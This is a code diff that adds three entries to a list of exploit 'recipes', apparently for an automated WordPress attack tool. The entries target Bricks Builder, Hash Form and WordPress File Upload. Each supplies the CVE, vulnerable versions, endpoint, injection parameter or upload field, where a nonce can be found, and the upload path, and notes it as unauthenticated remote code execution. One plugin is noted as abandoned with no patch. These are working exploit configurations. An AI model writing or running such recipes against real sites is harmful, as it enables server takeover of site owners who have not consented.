@@ -261,6 +261,57 @@ RECIPES = [
                 "execute as PHP. No authentication. Publicly accessible Contact Form 7 "
                 "interface. CVSS 9.8.",
     },
+    {
+        "plugin": "bricks",
+        "cve": "CVE-2024-25600",
+        "affected": "<=1.9.6",
+        "mode": "bricks-eval-injection",
+        "method": "POST",
+        "endpoint": "/wp-json/bricks/v1/render_element",
+        "params": {},
+        "inject_param": "queryEditor",
+        "nonce_from": {"url": "/", "key": "bricksRender", "object": None},
+        "payload_type": "eval-injection",
+        "source": "registry",
+        "note": "Unauth eval() code injection RCE (CVE-2024-25600, Bricks Builder "
+                "<=1.9.6): REST endpoint render_element passes queryEditor parameter to "
+                "PHP eval() without sanitization. Nonce publicly available on homepage. "
+                "CVSS 9.8. Actively exploited in-the-wild since April 2024.",
+    },
+    {
+        "plugin": "hash-form",
+        "cve": "CVE-2024-5084",
+        "affected": "<=1.1.0",
+        "mode": "hash-form-upload",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "hash_form_upload"},
+        "field": "file",
+        "upload_path": "/wp-content/uploads/hash-form/{filename}",
+        "payload_type": "file-upload-no-validation",
+        "source": "registry",
+        "note": "Unauth arbitrary file upload RCE (CVE-2024-5084, Hash Form <=1.1.0): "
+                "file_upload_action() has zero file type validation. Accepts .php directly. "
+                "No auth, plugin abandoned (no patch). CVSS 10.0 (perfect score). "
+                "Metasploit module available.",
+    },
+    {
+        "plugin": "wp-file-upload",
+        "cve": "CVE-2024-11613",
+        "affected": "<=4.24.15",
+        "mode": "wp-file-upload-traversal",
+        "method": "POST",
+        "endpoint": "/wp-admin/admin-ajax.php",
+        "params": {"action": "wfu_ajax_action"},
+        "field": "file",
+        "upload_path": "/wp-content/uploads/{filename}",
+        "payload_type": "file-upload-path-traversal",
+        "source": "registry",
+        "note": "Unauth file upload RCE via path traversal (CVE-2024-11613, WordPress "
+                "File Upload <=4.24.15): wfu_file_downloader endpoint accepts unsanitized "
+                "'source' parameter allowing ../ traversal. Vendor's security patch "
+                "introduced the vulnerability. CVSS 9.8. RCE via arbitrary file write.",
+    },
 ]
 
 
